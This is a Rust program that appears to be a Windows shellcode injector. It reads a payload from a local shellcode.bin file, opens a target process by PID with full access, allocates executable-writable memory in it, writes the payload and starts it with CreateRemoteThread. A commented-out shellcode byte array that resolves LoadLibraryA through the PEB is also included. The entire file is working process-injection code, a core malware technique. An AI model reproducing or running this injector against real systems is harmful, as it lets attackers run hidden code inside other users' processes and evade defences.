use std::{arch::asm, env, ffi::c_void, fs::File, io::Read, mem::transmute, process::exit, ptr::{self, null, null_mut}};
use anyhow::Result;
use windows::Win32::{Foundation::GetLastError, System::{Diagnostics::Debug::WriteProcessMemory, Memory::{VirtualAlloc, VirtualAllocEx, VirtualFree, VirtualProtectEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE}, Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS, PROCESS_VM_OPERATION, PROCESS_VM_WRITE}}};

fn main() {
    let payload = match read_shellcode_file() {
        Ok(s) => s,
        Err(e) => panic!("[-] Unable to read shellcode from file: {e}"),
    };

    // let payload: [u8; 512] = [
    //     0xe9,0xed,0x00,0x00,0x00,0x10,0x00,0x00,0xac,0x11,0x00,0x00,0xf2,0x10,0x00,0x00,0x87,0x11,0x00,0x00,0xb8,0x11,0x00,0x00,0x87,0x11,0x00,0x00,0xa9,0x11,0x00,0x00,0xc0,0x11,0x00,0x00,0x4b,0x00,0x45,0x00,0x52,0x00,0x4e,0x00,0x45,0x00,0x4c,0x00,0x33,0x00,0x32,0x00,0x2e,0x00,0x44,0x00,0x4c,0x00,0x4c,0x00,0x00,0x00,0x4c,0x6f,0x61,0x64,0x4c,0x69,0x62,0x72,0x61,0x72,0x79,0x41,0x00,0x65,0x66,0x67,0x00,0x00,0x18,0x00,0x00,0x00,0x00,0x80,0x00,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x56,0x53,0x50,0x66,0x81,0x39,0x4d,0x5a,0x75,0x6e,0xb8,0x78,0x56,0x34,0x12,0x81,0x39,0x50,0x45,0x00,0x00,0x75,0x6c,0x8b,0x51,0x18,0x45,0x31,0xc0,0x4c,0x8d,0x0d,0xb2,0xff,0xff,0xff,0x49,0x39,0xd0,0x74,0x5a,0x46,0x8b,0x14,0x81,0x49,0x89,0xcb,0x41,0x80,0x3b,0x00,0x4d,0x8d,0x5b,0x01,0x75,0xf6,0x49,0x01,0xca,0x4c,0x89,0xd0,0x49,0xc7,0xc3,0xff,0xff,0xff,0xff,0x43,0x80,0x7c,0x1a,0x01,0x00,0x4d,0x8d,0x5b,0x01,0x75,0xf4,0x49,0xff,0xc0,0x49,0x83,0xfb,0x0c,0x75,0xc8,0x45,0x31,0xdb,0x49,0x83,0xfb,0x0c,0x74,0x1b,0x43,0x8a,0x1c,0x1a,0x49,0x8d,0x73,0x01,0x43,0x3a,0x1c,0x0b,0x49,0x89,0xf3,0x74,0xe9,0xeb,0xac,0xcc,0xb8,0x78,0x56,0x34,0x12,0xeb,0x03,0x48,0x89,0xc8,0x48,0x83,0xc4,0x08,0x5b,0x5e,0xc3,0x48,0x83,0xec,0x28,0x48,0xc7,0xc1,0x00,0x00,0x00,0x00,0x48,0xc7,0xc2,0x00,0x00,0x00,0x00,0x65,0x48,0x8b,0x0c,0x25,0x60,0x00,0x00,0x00,0x48,0x8b,0x51,0x18,0x48,0x8b,0x42,0x10,0x48,0x8d,0x15,0x08,0xff,0xff,0xff,0x48,0x89,0xc1,0x4c,0x8b,0x41,0x60,0x4d,0x85,0xc0,0x74,0x3d,0x66,0x83,0x79,0x58,0x00,0x74,0x36,0x49,0xc7,0xc1,0xff,0xff,0xff,0xff,0x66,0x43,0x83,0x7c,0x48,0x02,0x00,0x4d,0x8d,0x49,0x01,0x75,0xf3,0x49,0x83,0xf9,0x0c,0x75,0x1c,0x45,0x31,0xc9,0x49,0x83,0xf9,0x18,0x74,0x22,0x45,0x0f,0xb7,0x14,0x11,0x4d,0x8d,0x59,0x02,0x66,0x47,0x3b,0x14,0x08,0x4d,0x89,0xd9,0x74,0xe7,0x48,0x8b,0x09,0x48,0x39,0xc1,0x75,0xb2,0xb9,0x78,0x56,0x34,0x12,0xeb,0x04,0x48,0x8b,0x49,0x30,0xe8,0xeb,0xfe,0xff,0xff,0x48,0x89,0xc1,0xe8,0x02,0x00,0x00,0x00,0xeb,0xfe,0x48,0x83,0xec,0x10,0x48,0x8d,0x05,0xb9,0xfe,0xff,0xff,0x48,0x89,0x04,0x24,0x48,0x89,0x4c,0x24,0x08,0x48,0x8b,0x04,0x24,0x48,0x8b,0x44,0x24,0x08,0x48,0x83,0xc4,0x10,0xc3,0xcc,0xcc,0xcc,0x01,0x03,0x03,0x00,0x03,0x02,0x02,0x30,0x01,0x60,0x00,0x00,0x01,0x04,0x01,0x00,0x04,0x42,0x00,0x00,0x01,0x04,0x01,0x00,0x04,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00];

    let pid = collect_proc_addr();

     // GET HANDLE TO PID
     let h_process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid) };
     let h_process = match h_process {
         Ok(h) => {
             println!("[+] Got handle to process ID {pid}, handle: {:?}", h);
             h // return the handle
         },
         Err(e) => panic!("[-] Could not get handle to pid {pid}, error: {e}"),
     };

     let payload_len = payload.len();
     let payload_ptr: *const c_void = payload.as_ptr() as *const c_void;

    unsafe {
        let remotememory_ptr: *mut c_void = VirtualAllocEx(h_process, None, payload_len, 
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if !remotememory_ptr.is_null() {
            println!("[+] Allocated memory address: {:p}", remotememory_ptr);

            let result_writeprocessmemory = WriteProcessMemory(h_process, 
                remotememory_ptr, payload_ptr, payload_len, None);

            match result_writeprocessmemory {
                Ok(_) => {
                    println!("[+] Successfully wrote process memory.");

                    
                    let result_createremotethread = CreateRemoteThread(h_process, 
                        None, 0, transmute(remotememory_ptr), None, 0, None);

                    match result_createremotethread {
                        Ok(_) => println!("[+] Thread created"),
                        Err(e) => eprintln!("[-] Error creating thread {e}"),
                    }
                },
                Err(e) => eprintln!("[-] Error writing process memory {e}"),
            }
        }
    }
}

fn collect_proc_addr() -> u32 {
    let args: Vec<String> = env::args().collect();

    if args.len() != 2 {
        eprintln!("[-] PID required.");
        exit(1);
    }

    let pid = args[1].clone();
    let pid_as_int: u32 = pid.parse().unwrap();

    pid_as_int
}

fn read_shellcode_file() -> Result<Vec<u8>> {
    let mut shellcode_file = File::open(r"C:\Users\ian\git\rust_shellcode\builder\output\shellcode.bin")?;
    let mut shellcode_buffer = Vec::new();
    shellcode_file.read_to_end(&mut shellcode_buffer)?;

    Ok(shellcode_buffer)
}